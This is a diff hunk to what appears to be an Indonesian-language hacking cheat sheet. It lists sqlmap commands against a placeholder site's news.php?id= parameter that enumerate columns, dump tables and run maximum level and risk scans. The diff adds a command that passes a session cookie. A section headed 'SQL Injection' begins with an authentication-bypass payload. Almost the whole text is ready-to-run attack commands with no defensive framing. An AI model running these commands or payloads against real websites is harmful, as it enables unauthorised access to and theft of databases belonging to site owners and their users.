@@ -6,6 +6,7 @@
 4. python2 sqlmap.py "situsanda.com/news.php?id=1" --columns -D namadatabase -T namatabel
 5. python2 sqlmap.py "situsanda.com/news.php?id=1" --dump -D namadatabase -T namatabel
 6. python2 sqlmap.py "situsanda.com/news.php?id=1" --level=5 --risk=3 --dbs
+7. python2 sqlmap.py "situsanda.com/news.php?id=1" --cookie='PHPSESSID=gsi3k0dblqj5tj8arcptqs73bi'
 
 # SQL Injection
 1. ' or 1=1 limit 1 -- -+
